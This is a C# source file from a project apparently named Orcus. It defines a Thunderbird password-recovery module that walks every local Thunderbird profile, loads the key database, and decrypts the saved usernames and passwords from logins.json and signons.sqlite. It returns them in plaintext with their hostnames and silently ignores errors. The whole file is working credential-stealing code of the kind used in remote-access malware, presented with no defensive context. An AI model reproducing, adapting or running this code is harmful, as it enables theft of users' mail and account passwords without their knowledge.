using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web.Script.Serialization;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Mozilla
{
    internal class Thunderbird : IPasswordRecovery
    {
        private const string ApplicationName = "Mozilla Thunderbird";

        //https://github.com/gourk/FirePwd.Net
        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            var result = new List<RecoveredPassword>();

            var appDataDir =
                new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Thunderbird\\Profiles"));

            if (!appDataDir.Exists)
                return result;

            foreach (var profile in appDataDir.GetDirectories())
            {
                var keyDatabase = new FileInfo(Path.Combine(profile.FullName, "key3.db"));
                if (!keyDatabase.Exists)
                    continue;

                var mozillaDecryptor = new MozillaDecryptor();

                try
                {
                    if (!mozillaDecryptor.Initialize(profile.FullName))
                        continue;
                }
                catch (Exception)
                {
                    continue;
                }

                var loginJson = new FileInfo(Path.Combine(profile.FullName, "logins.json"));
                if (loginJson.Exists)
                {
                    try
                    {
                        var loginData =
                            new JavaScriptSerializer().Deserialize<FirefoxLogins>(File.ReadAllText(loginJson.FullName));
                        foreach (var loginDataLogin in loginData.logins)
                        {
                            var username =  mozillaDecryptor.DecryptString(loginDataLogin.encryptedUsername);
                            var password = mozillaDecryptor.DecryptString(loginDataLogin.encryptedPassword);
                            if (!result.Any(x => x.UserName == username && x.Password == password))
                                result.Add(new RecoveredPassword
                                {
                                    Application = ApplicationName,
                                    UserName = username,
                                    Password = password,
                                    Field1 = loginDataLogin.hostname,
                                    PasswordType = PasswordType.Mail
                                });
                        }
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                var signonsFile = new FileInfo(Path.Combine(profile.FullName, "signons.sqlite"));
                if (signonsFile.Exists)
                {
                    try
                    {
                        var sqlDatabase = new SQLiteHandler(signonsFile.FullName);
                        if (sqlDatabase.ReadTable("moz_logins"))
                        {
                            var totalEntries = sqlDatabase.GetRowCount();
                            for (int i = 0; i < totalEntries; i++)
                            {
                                try
                                {
                                    var encryptedUsername = sqlDatabase.GetValue(i, "encryptedUsername");
                                    var encryptedPassword = sqlDatabase.GetValue(i, "encryptedPassword");
                                    var hostname = sqlDatabase.GetValue(i, "hostname");

                                    var username = mozillaDecryptor.DecryptString(encryptedUsername);
                                    var password = mozillaDecryptor.DecryptString(encryptedPassword);
                                    if (!result.Any(x => x.UserName == username && x.Password == password))
                                        result.Add(new RecoveredPassword
                                        {
                                            Application = ApplicationName,
                                            UserName = username,
                                            Password = password,
                                            Field1 = hostname,
                                            PasswordType = PasswordType.Mail
                                        });
                                }
                                catch (Exception)
                                {
                                    // ignored
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }
            }

            return result;
        }
    }
}